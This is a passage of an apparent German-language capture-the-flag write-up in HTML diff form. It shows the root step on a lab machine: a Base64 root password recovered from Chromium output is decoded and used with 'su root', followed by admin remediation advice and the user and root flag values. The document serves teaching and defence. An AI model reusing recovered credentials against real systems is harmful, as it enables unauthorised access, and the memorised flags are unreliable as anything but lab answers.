+                <br><strong>Empfehlung (Admin):</strong> **Absolut kritisch:** Entferne die `doas nopass` Regel für `chromium` und `kill`. Stelle sicher, dass sensible Dateien (wie `/root/script.js`, falls sie Passwörter enthalten) nur für Root lesbar sind.
+            </p>
+
+            <p>
+                Basierend auf der Analyse des Chromium-Outputs habe ich den Base64-String dekodiert. `UGhhbnRvbSBFbmdhZ2UK` dekodiert zu `Phantom Engage`. Ich habe versucht, dieses Passwort für den Root-Benutzer zu verwenden.
+            </p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <pre>
+<span class="password">softly@Chromee:~$</span> <span class="command">su root</span>
+<span class="command">Password: </span>
+<span class="password">root@Chromee:/home/softly#</span> <span class="command">id</span>
+<span class="password">uid=0(root) gid=0(root) grupos=0(root)</span></pre>
+                 </div>
+             </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Ich habe den Befehl `su root` ausgeführt, um zum Root-Benutzer zu wechseln. Das System fragte nach dem Root-Passwort. Ich habe das aus dem Chromium-Output abgeleitete und dekodierte Passwort (`Phantom Engage`) eingegeben. Die Authentifizierung war erfolgreich und ich erhielt eine Root-Shell. Der Befehl `id` bestätigt, dass ich nun als Root (UID 0, GID 0) angemeldet bin.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Fantastisch! Der Root-Zugriff war erfolgreich, nun haben wir unser Ziel erreicht! Die Kombination aus der kompromittierten `softly` Shell, der unsicheren `doas` Konfiguration und dem über Chromium zugänglichen Root-Passwort ermöglichte die vollständige Kompromittierung des Systems.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Sammle die Root-Flag. Führe notwendige Post-Exploitation-Schritte durch. Dokumentiere den gesamten Weg zum Root sorgfältig.
+                <br><strong>Empfehlung (Admin):</strong> **Absolut kritisch:** Ändere das Root-Passwort. Behebe die unsichere `doas`-Konfiguration und stelle sicher, dass sensible Dateien im Root-Verzeichnis (`/root/script.js`) nicht für andere Benutzer lesbar sind oder sensible Informationen (wie Passwörter) im Klartext/Base64 enthalten. Implementiere regelmäßige Sicherheitsaudits der Systemkonfiguration.
+            </p>
+        </section>
+
+        <section id="flags">
+            <div class="flag-container">
+                <h2 class="flag-heading">Flags</h2>
+                <div class="flag-entry">
+                    <div class="flag-command"># cat /home/analyst/user.txt</div> <!-- Befehl angepasst basierend auf Canto -->
+                    <div class="flag-value"><span class="password">brightctf{DIR_EN_GREY_59ce1d6c207}</span></div> <!-- User Flag aus SSH-Meldung -->
+                </div>
+                <div class="flag-entry">
+                    <div class="flag-command"># cat /root/root.txt</div>
+                    <div class="flag-value"><span class="password">flag{e96f7a29ba633b4e43214b43d1791074}</span></div>
+                </div>
+            </div>
+        </section>
+
+    </div> <!-- Ende container -->
+
+    <footer class="footer">
+        <p>Ben - Cyber Security Reports</p>
+        <p>Berichtsdatum: 22. Juni 2025</p>
+    </footer>
+
+    <!-- Anmerkungen zu Bildnamen (falls zutreffend). Dieser Block wird nur hinzugefügt, wenn Bilder im Text gefunden und verarbeitet wurden. -->
+
+</body>
+</html> 
